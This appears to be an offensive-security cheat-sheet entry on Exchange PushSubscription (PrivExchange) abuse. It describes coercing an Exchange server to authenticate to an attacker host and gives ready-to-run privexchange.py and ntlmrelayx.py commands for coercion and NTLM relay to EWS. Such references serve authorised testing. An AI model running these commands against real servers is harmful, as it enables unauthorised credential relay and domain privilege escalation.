---
technique: PushSubscriptionAbuse
category: mitm
targets: Exchange Server
protocols: EWS, HTTP, NTLM
remote_capable: true
tags: exchange privexchange pushsubscription coercion ntlm-relay ad
---

# PushSubscriptionAbuse

Exchange PushSubscription abuse uses EWS push notifications to force an Exchange server to authenticate to an attacker-controlled host. The coerced HTTP authentication can be captured or relayed, and older Exchange permission models made this especially powerful for domain privilege escalation.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| EWS access | The attacker needs credentials or a relay path to call Exchange Web Services |
| Listener | Capture or relay infrastructure must be ready before triggering the subscription |
| Patch state | Modern Exchange updates reduced the original high-impact abuse path |

## Linux

### PrivExchange

#python #exchange #coercion

Trigger Exchange EWS PushSubscription authentication to the attacker host.

```sh title:"Coerce Exchange authentication with PrivExchange"
privexchange.py -d "$domain" -u "$user" -p "$pass" -ah "$lhost" "$exchange_server"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var exchange_server
-->

### ntlmrelayx EWS relay trigger

#python #impacket #relay

Relay authentication to EWS to trigger PushSubscription abuse without known Exchange credentials.

```sh title:"Relay authentication to Exchange EWS for PushSubscription"
ntlmrelayx.py -t "https://$exchange_server/EWS/Exchange.asmx"
```
<!-- cheat
var exchange_server
-->
